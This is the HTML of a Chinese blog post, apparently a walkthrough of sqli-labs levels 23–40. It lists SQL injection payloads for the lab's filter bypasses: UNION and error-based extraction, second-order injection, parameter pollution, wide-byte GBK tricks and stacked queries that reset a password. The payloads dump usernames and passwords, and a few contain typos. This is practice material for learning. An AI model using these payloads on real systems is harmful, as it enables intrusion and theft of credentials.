@@ -1,0 +1,501 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>sqli-labs 23-40 | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="sqli-labs 23-40 | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="less-23——过滤注释的GET型注入
+字段名
+?id=0' union select 1,2,3 '  出现的数字是最大的字段为3
+
+数据库名
+?id=0' union select 1,2,(select group_concat(s..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              sqli-labs 23-40
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-04-14
+              </span>
+              <span>
+                16 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="less-23过滤注释的get型注入">less-23——过滤注释的GET型注入</h1>
+<p>字段名</p>
+<pre><code>?id=0' union select 1,2,3 '  出现的数字是最大的字段为3
+</code></pre>
+<p>数据库名</p>
+<pre><code>?id=0' union select 1,2,(select group_concat(schema_name) from information_schema.schemata) ' 
+</code></pre>
+<p>表名</p>
+<pre><code>?id=0' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema = database()) '
+</code></pre>
+<p>列名</p>
+<pre><code>?id=0' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users') '
+</code></pre>
+<p>数据</p>
+<pre><code>?id=0' union select 1,2,(select group_concat(username) from users) '
+</code></pre>
+<h1 id="less-24-二次注入">less-24-二次注入</h1>
+<p>首先先创建一个用户 注意找new user<br>
+然后输入数据</p>
+<pre><code>username=admin'#
+passwd=123
+</code></pre>
+<p>然后会显示成功<br>
+然后再登录进去修改密码修改成123456则原来admin用户的密码得到了改变</p>
+<h1 id="less-25-过滤orand">less-25-过滤[or,and]</h1>
+<p>注入点[']<br>
+数据库名</p>
+<pre><code>?id=0' || extractvalue(1,concat(0x7e,(select database()),0x7e)) --+ 单个数据库
+?id=0' || extractvalue(1,concat(0x7e,(select group_concat(schema_name) from infoorrmation_schema.schemata),0x7e)) --+ 多个数据库
+</code></pre>
+<p>表名</p>
+<pre><code>?id=0' || extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()),0x7e)) --+
+</code></pre>
+<p>列名</p>
+<pre><code>?id=0' || extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_name='users'),0x7e)) --+
+</code></pre>
+<p>数据</p>
+<pre><code>?id=0' || extractvalue(1,concat(0x7e,(select group_concat(username) from users),0x7e)) --+
+</code></pre>
+<h1 id="less-25a-过滤orand">less-25a-过滤[or,and]</h1>
+<p>判断数据字段</p>
+<pre><code>?id=0 union select 1,2,3   password显示的是最大字段
+</code></pre>
+<p>数据库名</p>
+<pre><code>?id=0 union select 1,2,(select group_concat(schema_name) from infoorrmation_schema.schemata)
+</code></pre>
+<p>表名</p>
+<pre><code>?id=0 union select 1,2,(select group_cocat(table_name) from infoorrmation_schema.tables where table_schema=database())
+</code></pre>
+<p>列名</p>
+<pre><code>?id=0 union select 1,2,(select group_concat(column_name) from infoorrmation_schema.columns where table_name='users')
+</code></pre>
+<p>数据</p>
+<pre><code>?id=0 union select1,2,(select group_concat(username) from users)
+</code></pre>
+<h1 id="less-26-trick-with-comments-and-space-过滤了注释和空格的注入">less-26-Trick with comments and space (过滤了注释和空格的注入)</h1>
+<p>单引号没有被过滤，我们使用两个单引号分别闭合前后的引号。网页回显正常的内容，说明该网页存在单引号闭合的字符型注入<br>
+判断什么类型</p>
+<pre><code>?id=0' || 1=1 和 ?id=0' || 1=2 回显错误
+然后 ?id=0' || '1'='2回显错误
+最后 ?id=0' || '1'='1回显正确
+</code></pre>
+<p>数据库名</p>
+<pre><code>此时我们可以使用 updatexml() 报错注入，因为这种手法不需要考虑空格的问题。爆数据库名。
+多条数据库：?id=0' || updatexml(1,concat(0x7e,(select (group_concat(schema_name)) from (infoorrmation_schema.schemata))),1) || '1'='1
+单条数据库：?id=0' || updatexml(1,concat(0x7e,database()),1) || '1'='1
+</code></pre>
+<p>表名</p>
+<pre><code>?id=0' || updatexml(1,concat(0x7e,(select (group_concat(table_name)) from (infoorrmation_schema.tables) where (table_schema=database()),0x7e)) || '1'='1
+</code></pre>
+<p>列名</p>
+<pre><code>?id=0' || updatexml(1,concat(0x7e,(select (group_concat(column_name)) from (infoorrmation_schema.columns) where (table_name='users'))),1) || '1'='1
+</code></pre>
+<p>数据</p>
+<pre><code>?id=0' || updatexml(1,concat(0x7e,(select (group_concat(username)) from (users))),1) || '1'='1
+</code></pre>
+<p>Less 26a-GET-Blind Based-All your SPACES and COMMENTS belong to us (过滤了空格和注释的盲注)<br>
+由于报错信息不回显，所以 updatexml() 报错注入不能使用。此处就需要使用 URL 编码来代替空格，然后用 UNION 注入。判断有几列可用，别忘了 “ORDER” 中的 “or” 被过滤掉了。</p>
+<h1 id="判断注入类型">判断注入类型</h1>
+<p>注入正常的参数，网页返回对应 id 的正常信息，注入两个单引号分别闭合前后的引号。网页回显正常的内容，说明该网页存在单引号闭合的字符型注入</p>
+<pre><code>?id=1 和 ?id=1'' 回显正确
+</code></pre>
+<p>尝试构造左右半边的空格来闭合，网页回显正常，说明参数有使用单层括号来闭合。</p>
+<pre><code>?id=1') || ('1
+</code></pre>
+<h1 id="判断数据字段">判断数据字段</h1>
+<pre><code>?id=0')%a0oorrder%a0by%a03||('1
+</code></pre>
+<p>数据库</p>
+<pre><code>?id=0')%a0union%a0select%a01,database(),3%a0||('1
+</code></pre>
+<p>表名</p>
+<pre><code>?id=0')%a0union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()||('1
+</code></pre>
+<p>列名</p>
+<pre><code>?id=0')%a0union%a0select%a01,group_concat(column_name),3%a0from%a0infoorrmation_schema.columns%a0where%a0table_name='users'||('1
+</code></pre>
+<p>数据</p>
+<pre><code>?id=0')%a0UNION%a0SELECT%a01,group_concat(concat_ws(&quot;:&quot;,username,passwoORrd)),3%a0FROM%a0users%a0WHERE%a0('1
+</code></pre>
+<p>#Less-27 过滤【 /、*、–、#、 +、空格+、select、Select、SELECT、union、Union、UNION、】<br>
+注入点【 ’ 】<br>
+检测是什么注入</p>
+<pre><code>测试?id=1 and 1=1 和 ?id=1 and 1=2回显相同且回显正确说明不是数字型注入
+测试?id=1' and '1'='1 和 ?id=1' and '1'='2回显不同说明是字符型注入
+</code></pre>
+<p>检测字段</p>
+<pre><code>?id=1'%a0unIon%a0seLect%a01,2,3'
+</code></pre>
+<p>表名</p>
+<pre><code>?id='%a0unIon%a0SeLect%a01,group_concat(table_name),3%a0from%a0information_schema.tables%a0where%a0table_schema=database()%a0||'1
+</code></pre>
+<p>列名</p>
+<pre><code>?id='%a0unIon%a0SeLect%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'%a0||'1
+</code></pre>
+<p>数据</p>
+<pre><code>?id=0'%a0unIon%a0SeLect%a01,group_concat(concat_ws(&quot;:&quot;,username,password)),3%a0from%a0users%a0where%a0'1
+</code></pre>
+<p>#Less-27a 过滤【 /、*、–、#、 +、空格+、select、Select、SELECT、union、Union、UNION、】<br>
+注入点【 &quot; 】<br>
+查询字段<br>
+Your Password:3这个显示的就是最大字段为3</p>
+<pre><code>?id=&quot;%a0unIon%a0SelECT%a01,2,3&quot; 
+</code></pre>
+<p>查询数据库名</p>
+<pre><code>?id=&quot;%a0unIon%a0SelEct%a01,database(),3&quot;
+</code></pre>
+<p>查询表名</p>
+<pre><code>?id=&quot;%a0UnIon%a0SelEct%a01,group_concat(table_name),3%a0from%a0information_schema.tables%a0where%a0table_schema=database()||&quot;
+</code></pre>
+<p>查询列名</p>
+<pre><code>?id=&quot;%a0UnIOn%a0SelEct%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'||&quot;
+</code></pre>
+<p>查询数据</p>
+<pre><code>?id=0&quot;%a0unIon%a0SeLect%a01,group_concat(concat_ws(&quot;:&quot;,username,password)),3%a0from%a0users%a0where%a0&quot;1
+</code></pre>
+<h1 id="less-28-过滤-空格-unionsselecti组合型拼接union-select">Less-28 过滤【 /*、–、#、 +、空格+、/union\s+select/i（组合型拼接：union select）】</h1>
+<p>注入点【 ') 】<br>
+检测是什么类型</p>
+<pre><code>?id=1')and('1')=('1回显正常
+?id=1')and('1')=('2回显错误
+说明就是')类型
+</code></pre>
+<p>查询数据库名称</p>
+<pre><code>?id=0')union%a0select%a01,database(),('
+</code></pre>
+<p>查询表</p>
+<pre><code>?id=')union%a0select%a01,group_concat(table_name),3%a0from%a0information_schema.tables%a0where%a0table_schema=database()||('1
+</code></pre>
+<p>查询列名</p>
+<pre><code>?id=')union%a0select%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'||('
+</code></pre>
+<p>查询数据</p>
+<pre><code>?id=')union%a0select%a01,group_concat(concat_ws(&quot;:&quot;,username,password)),3%a0from%a0users%a0where('1
+</code></pre>
+<h1 id="less-28-过滤-空格-unionsselecti组合型拼接union-select-2">Less-28 过滤【 /*、–、#、 +、空格+、/union\s+select/i（组合型拼接：union select）】</h1>
+<p>注入点【 ') 】<br>
+判断是什么类型</p>
+<pre><code>?id=1') and ('1')=('2    回显错误
+?id=1') and ('1')=('1    回显正确
+</code></pre>
+<p>查数据库</p>
+<pre><code>?id=0')%a0union%a0select%a01,database(),3%a0||('
+</code></pre>
+<p>查表名</p>
+<pre><code>?id=0')%a0union%a0select%a01,group_concat(table_name),3%a0from%a0information_schema.tables%a0where%a0table_schema=database()%a0||('
+</code></pre>
+<p>查列名</p>
+<pre><code>?id=0')%a0union%a0select%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'%a0||('
+</code></pre>
+<p>查数据</p>
+<pre><code>?id=')union%a0select%a01,group_concat(concat_ws(&quot;:&quot;,username,password)),3%a0from%a0users%a0where('
+</code></pre>
+<h1 id="less-29">Less-29</h1>
+<p>知识点：<br>
+​ 1.服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。</p>
+<p>工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
+<p>接下来是参数解析的问题。 问：index.php?id=1&amp;id=2，这时回显是id=1还是id=2呢？ 答：apache (php) 解析最后一个参数，即回显id=2；tomcat (jsp) 解析第一个参数，即回显id=1。</p>
+<p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。</p>
+<p>工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
+<p>接下来是参数解析的问题。 问：index.php?id=1&amp;id=2，这时回显是id=1还是id=2呢？ 答：apache (php) 解析最后一个参数，即回显id=2；tomcat (jsp) 解析第一个参数，即回显id=1。</p>
+<p>问：index.jsp?id=1&amp;id=2，针对这关的两层结构，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 请求 apache，apache 解析最后一个参数。那么最终返回客户端的是哪个参数？ 答：此处应该还是id=2，因为实际上提供服务的是 apache 服务器，返回的数据也应该是 apache 处理的数据。</p>
+<p>而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 WAF。</p>
+<p>而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。如 payload：index.jsp?id=1&amp;id=0 or 1=1–+，tomcat 只检查第一个参数id=1，而对第二个参数id=0 or 1=1–+不做检查，直接传给了 apache，apache 恰好解析第二个参数，便达到了攻击的目的。</p>
+<p>该用法就是 HPP（HTTP Parameter Pollution）即 HTTP 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。</p>
+<p>​ —-来源MySQL注入天书之服务器两层架构</p>
+<p>Payload:<br>
+​ 1.在开始前选择login.php文件，否则与第一关一样了</p>
+<pre><code>login.php?id=1&amp;id=-1’ union select 1,database(),3 –+ ,然后逐步注入。
+</code></pre>
+<h1 id="less-30">Less-30</h1>
+<p>​ 1.id的包裹变为 “ 其他与上一关一样。</p>
+<pre><code>login.php?id=1&amp;id=-1” union select 1,database(),3 –+
+</code></pre>
+<h1 id="less-31">Less-31</h1>
+<p>​ 2.id的包裹变为 “) 其他与上一关一样。</p>
+<pre><code>login.php?id=1&amp;id=-1&quot;) union select 1,database(),3 –+    
+</code></pre>
+<h1 id="less-32">Less-32</h1>
+<p>​ 1.宽字节注入。</p>
+<pre><code>function check_addslashes($string)
+{
+$string = preg_replace('/'. preg_quote('\\') .'/', &quot;\\\\\\&quot;, $string);  //escape any backslash
+$string = preg_replace('/\'/i', '\\\'', $string);   //escape single quote with a backslash
+$string = preg_replace('/\&quot;/', &quot;\\\&quot;&quot;, $string);//escape double quote with a backslash
+
+
+return $string;
+}
+</code></pre>
+<p>对 /, ‘, “ 进行了过滤。</p>
+<p>​ 通常，一个GBK编码汉字，占用2个字节。</p>
+<p>​ mysql在使用GBK编码时，会认为两个字符为一个汉字。例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。</p>
+<p>​ 在%5c%27前添加%df构成%df%5c%27 (%5c : \的编码，%27：’的编码)，mysql在GBK编码时，会将两个字节(%df%5c)当作一个汉字，从而将\去除。 (也可以使用 %bf, %81,%82等)</p>
+<p>Payload:</p>
+<pre><code>​ 1.?id=1%df’ ,得到语法错误提示 id为 ‘ 包裹。
+
+​ 2.?id=1%df’ order by x –+ (x=1,2,3,4) 判断字段。
+
+​ 3.?id=0%df’ union select 1,2,3 –+ ,看回显位置。然后同之前步骤解决。
+
+​ 4.查询列名时采用16进制绕过’‘需求，将 users 转换为16进制，其他照常。
+?id=0%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+
+</code></pre>
+<h1 id="less-33">Less-33</h1>
+<p>​ addslashes()函数，addslashes(string)返回在预定义字符之前家反斜杠\字符串：<br>
+单引号 ’<br>
+双引号 “<br>
+反斜杠 <br>
+空字符 null</p>
+<p>注入和上一关一样。</p>
+<h1 id="less-34">Less-34</h1>
+<p>所以需要对%df进行优先解码，%df解码后为 �，所以闭合符号为 �'</p>
+<pre><code>uname=123�' union select 1,2#&amp;passwd=admin&amp;submit=Submit 检测出字段为2
+uname=123�' union select 1,group_concat(schema_name) from information_schema.schemata#&amp;passwd=admin&amp;submit=Submit
+uname=123�' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=admin&amp;submit=Submit
+uname=123�' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#&amp;passwd=admin&amp;submit=Submit
+uname=123�' union select 1,group_concat(username) from users#&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h1 id="less-35">Less-35</h1>
+<pre><code>?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata
+?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
+?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273
+?id=-1 union select 1,group_concat(username),3 from users
+</code></pre>
+<h1 id="less-36">Less-36</h1>
+<pre><code>?id=-1%df' union select 1,2,group_concat(username) from users --+
+?id=-1%df' union select 1,2,group_concat(schema_name) from information_schema.schemata --+
+
+?id=-1%df' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+
+?id=-1%df' union select 1,2,group_concat(username,password) from users --+
+</code></pre>
+<h1 id="less-37">Less-37</h1>
+<p>所以需要对%df进行优先解码，%df解码后为 �，所以闭合符号为 �'</p>
+<pre><code>uname=123�' union select 1,2#&amp;passwd=admin&amp;submit=Submit 检测出字段为2
+uname=123�' union select 1,group_concat(schema_name) from information_schema.schemata#&amp;passwd=admin&amp;submit=Submit
+uname=123�' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=admin&amp;submit=Submit
+uname=123�' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#&amp;passwd=admin&amp;submit=Submit
+uname=123�' union select 1,group_concat(username) from users#&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h1 id="less-38">Less-38</h1>
+<p>堆叠注入：</p>
+<ul>
+<li>介绍与原理:<br>
+​ 可以理解为多条SQL语句一起使用。（MySQL的多语句查询）在SQL中，分号(😉 是语句结束的标志，我们可以在一条语句的后方加上; 继续构造下一语句。</li>
+</ul>
+<p>​ 堆叠语句与union联合注入区别为：union执行的语句类型是有限的，而堆叠注入可以执行任意语句。</p>
+<p>​ 堆叠注入之前要知道数据库的一些相关信息，如：表名，列名等信息。 因为代码通常只返回一个查询结果，因此堆叠注入第二个语句产生错误或结果只能被忽略，我们在前端界面无法看到返回结果。</p>
+<p>使用条件</p>
+<p>mysql_multi_query() 执行多条查询的函数–防止注入改为mysql_query()函数。（mysql_query()函数执行一条MySQL查询）</p>
+<p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
+<p>Payload:</p>
+<pre><code>1.?id=-1’ union select 1,database(),3 –+ ,正常查询出表名，列名，用户名，密码。
+2.?id=1’;update users set password=’123’ where username=’Dumb’; –+ ,采用堆叠注入，查询的同时修改了Dumb的密码为：123，后查询发现成功修改。
+</code></pre>
+<p>检测类型</p>
+<pre><code>?id=1 and 1=1 和 ?id=1 and 1=2回显一样
+?id=1' and '1'='1回显正常 但是?id=1' and '1'='2回显错误
+说明是字符型注入
+
+?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
+?id=-1' union select 1,2,database() --+
+?id=-1' union select 1,2,version() --+
+?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+
+?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+?id=-1' union select 1,2,group_concat(concat_ws(&quot;:&quot;,username,password)) from users --+
+</code></pre>
+<h1 id="less-39">Less-39</h1>
+<p>​ 1.判断为数字型注入。<br>
+​ 2.正常注入得到表名等。<br>
+​ 3.同38，堆叠注入，还是与38同。（改为数字型）<br>
+判断什么类型</p>
+<pre><code>?id=1 and 1=1 回显正确
+?id=1 and 1=2 回显错误
+所以是数字型
+?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata --+
+?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
+?id=-1 union select 1,2,group_concat(concat_ws(&quot;:&quot;,username,password)) from users --+
+</code></pre>
+<h1 id="less-40">Less-40</h1>
+<p>判断什么类型,闭合符号为(' ')</p>
+<pre><code>?id=1') and ('1')=('1回显正确
+?id=1') and ('1')=('2回显错误
+?id=1') union select 1,2,group_concat(schema_name) from information_schema.schemata--+
+?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
+?id=-1') union select 1,2,group_concat(concat_ws(&quot;:&quot;,username,password)) from users --+
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#less-23%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%9A%84get%E5%9E%8B%E6%B3%A8%E5%85%A5">less-23——过滤注释的GET型注入</a></li>
+<li><a href="#less-24-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">less-24-二次注入</a></li>
+<li><a href="#less-25-%E8%BF%87%E6%BB%A4orand">less-25-过滤[or,and]</a></li>
+<li><a href="#less-25a-%E8%BF%87%E6%BB%A4orand">less-25a-过滤[or,and]</a></li>
+<li><a href="#less-26-trick-with-comments-and-space-%E8%BF%87%E6%BB%A4%E4%BA%86%E6%B3%A8%E9%87%8A%E5%92%8C%E7%A9%BA%E6%A0%BC%E7%9A%84%E6%B3%A8%E5%85%A5">less-26-Trick with comments and space (过滤了注释和空格的注入)</a></li>
+<li><a href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B">判断注入类型</a></li>
+<li><a href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5">判断数据字段</a></li>
+<li><a href="#less-28-%E8%BF%87%E6%BB%A4-%E7%A9%BA%E6%A0%BC-unionsselecti%E7%BB%84%E5%90%88%E5%9E%8B%E6%8B%BC%E6%8E%A5union-select">Less-28 过滤【 /*、–、#、 +、空格+、/union\s+select/i（组合型拼接：union select）】</a></li>
+<li><a href="#less-28-%E8%BF%87%E6%BB%A4-%E7%A9%BA%E6%A0%BC-unionsselecti%E7%BB%84%E5%90%88%E5%9E%8B%E6%8B%BC%E6%8E%A5union-select-2">Less-28 过滤【 /*、–、#、 +、空格+、/union\s+select/i（组合型拼接：union select）】</a></li>
+<li><a href="#less-29">Less-29</a></li>
+<li><a href="#less-30">Less-30</a></li>
+<li><a href="#less-31">Less-31</a></li>
+<li><a href="#less-32">Less-32</a></li>
+<li><a href="#less-33">Less-33</a></li>
+<li><a href="#less-34">Less-34</a></li>
+<li><a href="#less-35">Less-35</a></li>
+<li><a href="#less-36">Less-36</a></li>
+<li><a href="#less-37">Less-37</a></li>
+<li><a href="#less-38">Less-38</a></li>
+<li><a href="#less-39">Less-39</a></li>
+<li><a href="#less-40">Less-40</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/mariadb-xiu-gai-mi-ma-bu-sheng-xiao/">
+              <h3 class="post-title">
+                MariaDB修改密码不生效
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
